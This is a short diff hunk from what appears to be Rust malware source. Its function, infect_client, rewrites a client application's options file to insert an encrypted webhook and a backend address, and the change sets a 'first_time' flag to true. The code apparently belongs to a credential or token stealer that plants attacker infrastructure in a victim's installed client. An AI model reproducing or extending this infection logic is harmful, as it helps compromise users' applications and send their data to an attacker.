@@ -35,7 +35,7 @@ fn infect_client(
                 config["encrypted_webhook"] =
                     Value::String(constants::ENCRYPTED_WEBHOOK.to_string());
                 config["backend"] = Value::String(constants::BACKEND.to_string());
-                config["first_time"] = Value::Bool(false);
+                config["first_time"] = Value::Bool(true);
                 fs::write(&options_path, config.to_string())?;
             }
         }
